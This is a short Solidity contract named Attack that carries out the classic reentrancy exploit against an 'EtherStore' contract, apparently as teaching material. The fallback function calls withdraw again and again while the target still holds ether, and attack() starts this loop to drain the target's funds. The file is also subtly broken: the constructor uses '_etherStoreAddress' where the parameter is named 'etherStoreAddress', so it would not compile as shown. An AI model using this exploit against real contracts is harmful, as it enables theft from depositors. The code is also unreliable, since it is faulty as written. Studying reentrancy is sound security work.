pragma solidity ^0.6.10;
contract Attack {
    EtherStore public etherStore;
    constructor(address etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }
    fallback() external payable {
        if (address (etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }
    function getBalance() public view returns (uint) {
        return address (this).balance;
    }
}